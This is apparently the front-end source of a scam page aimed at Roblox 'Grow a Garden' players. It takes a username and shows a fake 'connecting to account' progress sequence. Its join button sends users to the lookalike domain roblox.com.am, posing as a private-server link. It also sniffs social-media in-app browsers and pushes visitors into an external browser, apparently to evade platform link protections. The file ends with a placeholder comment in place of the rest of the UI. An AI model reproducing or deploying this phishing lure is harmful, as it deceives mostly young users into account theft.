"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { useToast } from "@/hooks/use-toast"
import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { ExternalLink, Sparkles, CheckCircle, Loader2, Users, Clock, Shield, AlertTriangle } from "lucide-react"

interface RobloxUser {
  id: number
  name: string
  displayName: string
  description: string
  created: string
  isBanned: boolean
  externalAppDisplayName: string | null
  hasVerifiedBadge: boolean
  avatarUrl: string | null
}

export default function HomePage() {
  const [username, setUsername] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showServerProcess, setShowServerProcess] = useState(false)
  const [processStep, setProcessStep] = useState(-1)
  const [showJoinButton, setShowJoinButton] = useState(false)
  const [showBrowserWarning, setShowBrowserWarning] = useState(false)
  const { toast } = useToast()

  // ✅ Improved detection logic
  useEffect(() => {
    const detectInAppBrowser = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera

      // Detect social media in-app browsers + TikTok variations
      const isInAppBrowser =
        /FBAN|FBAV|Instagram|Twitter|Snapchat|LinkedIn|WhatsApp|Telegram|Line|WeChat|MicroMessenger|Pinterest|Reddit/i.test(
          userAgent
        ) ||
        /TikTok|musical\.ly|com\.zhiliaoapp\.musically/i.test(userAgent)

      if (isInAppBrowser) {
        setShowBrowserWarning(true)
        return
      }

      // Fallback: Detect restricted window.open (common in in-app browsers)
      try {
        const testWindow = window.open("", "_blank")
        if (!testWindow || testWindow.closed || typeof testWindow.closed === "undefined") {
          setShowBrowserWarning(true)
        } else {
          testWindow.close()
        }
      } catch {
        setShowBrowserWarning(true)
      }
    }

    detectInAppBrowser()
  }, [])

  // ✅ Improved external browser redirect logic
  const openInBrowser = () => {
    const currentUrl = window.location.href

    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      // iOS - Try Chrome then fallback to Safari
      window.location.href = `googlechrome://${currentUrl.replace(/^https?:\/\//, "")}`
      setTimeout(() => {
        window.location.href = currentUrl
      }, 1500)
    } else if (/Android/i.test(navigator.userAgent)) {
      // Android - Try Chrome intent
      window.location.href = `intent://${currentUrl.replace(/https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`
      setTimeout(() => {
        window.location.href = currentUrl
      }, 1500)
    } else {
      // Desktop or fallback
      window.location.reload()
    }
  }

  useEffect(() => {
    if (showServerProcess) {
      const processSteps = ["Connecting to account...", "Finding old servers...", "Awaiting final confirmation..."]

      if (processStep === -1) {
        const timer = setTimeout(() => {
          setProcessStep(0)
        }, 500)
        return () => clearTimeout(timer)
      }

      if (processStep >= 0 && processStep < processSteps.length - 1) {
        const timer = setTimeout(() => {
          setProcessStep(processStep + 1)
        }, 1200)
        return () => clearTimeout(timer)
      }

      if (processStep === processSteps.length - 1) {
        const timer = setTimeout(() => {
          setShowJoinButton(true)
        }, 1500)
        return () => clearTimeout(timer)
      }
    }
  }, [showServerProcess, processStep])

  const fetchRobloxUser = async (username: string) => {
    setIsLoading(true)
    try {
      const response = await fetch(`/api/roblox-user?username=${encodeURIComponent(username)}`)

      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.error || "Failed to fetch user")
      }

      const userData = await response.json()
      setRobloxUser(userData)
      setShowServerProcess(true)
      setProcessStep(-1)
    } catch (error) {
      toast({
        title: "User Not Found",
        description: "Could not find a Roblox user with that username",
        variant: "destructive",
      })
      setRobloxUser(null)
    } finally {
      setIsLoading(false)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!username.trim()) {
      toast({
        title: "Username Required",
        description: "Please enter your Roblox username",
        variant: "destructive",
      })
      return
    }

    setShowServerProcess(false)
    setShowJoinButton(false)
    setProcessStep(-1)

    await fetchRobloxUser(username.trim())
  }

  const handlePetGenerator = () => {
    window.open("https://v0-pet-generator-growagarden.vercel.app/", "_blank")
  }

  const handleJoinServer = () => {
    window.open(
      "https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=33043799204089892731978860331402",
      "_blank"
    )
  }

  const processSteps = ["Connecting to account...", "Finding old servers...", "Awaiting final confirmation..."]

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 relative"
      style={{
        backgroundImage: "url(/grow-a-garden-bg.jpg)",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
      }}
    >
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/20 to-black/40" />

      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-yellow-400 rounded-full animate-pulse opacity-60" />
        <div className="absolute top-1/3 right-1/3 w-1 h-1 bg-green-400 rounded-full animate-bounce opacity-40" />
        <div className="absolute bottom-1/4 left-1/3 w-1.5 h-1.5 bg-blue-400 rounded-full animate-pulse opacity-50" />
      </div>

      {showBrowserWarning && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="bg-gradient-to-br from-red-50 to-orange-50 border-4 border-red-500 shadow-2xl rounded-2xl max-w-md w-full">
            <CardContent className="p-6 text-center">
              <div className="mb-4">
                <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4 animate-bounce" />
                <h2 className="text-2xl font-black text-red-600 mb-2 uppercase tracking-wide">⚠️ Browser Required!</h2>
                <p className="text-gray-700 font-bold mb-4">
                  This app works best in your default browser, not in social media apps.
                </p>
                <p className="text-sm text-gray-600 mb-6">
                  For the best experience and full functionality, please open this link in Safari, Chrome, or your
                  default browser.
                </p>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={openInBrowser}
                  className="w-full text-lg font-black py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-3 border-blue-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 uppercase tracking-wide"
                >
                  🌐 Open in Browser
                </Button>

                <Button
                  onClick={() => setShowBrowserWarning(false)}
                  variant="outline"
                  className="w-full text-sm font-bold py-2 border-2 border-gray-400 text-gray-600 hover:bg-gray-100 rounded-xl"
                >
                  Continue Anyway
                </Button>
              </div>

              <div className="mt-4 text-xs text-gray-500">
                <p>📱 iOS: Tap "Open in Browser" then choose Safari</p>
                <p>🤖 Android: Tap "Open in Browser" then choose Chrome</p>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Your entire UI remains unchanged below */}
      {/* ... */}
